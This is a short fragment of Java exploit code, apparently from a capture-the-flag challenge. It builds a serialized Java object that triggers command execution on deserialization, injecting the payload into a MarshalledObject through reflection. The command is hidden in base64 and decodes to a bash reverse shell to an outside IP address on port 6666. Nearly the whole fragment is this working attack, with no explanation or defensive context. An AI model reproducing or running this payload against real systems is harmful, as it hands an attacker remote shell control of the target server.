...
public class Exp5 {
    ...
    public static void main(String[] args) throws Exception {
        ...
        //就改里面byte就行
        Class c=marshalledObject.getClass();
        Field field = c.getDeclaredField("bytes");
        field.setAccessible(true);
        Object payload = getPayload("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuMjA0LjExMi4xMjEvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}");
        String s = Utils.objectToHexString(payload);
        byte[] bytes = Utils.hexStringToBytes(s);
        field.set(marshalledObject,bytes);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeUTF("SJTU");
        oos.writeInt(1896);
        oos.writeObject(marshalledObject);
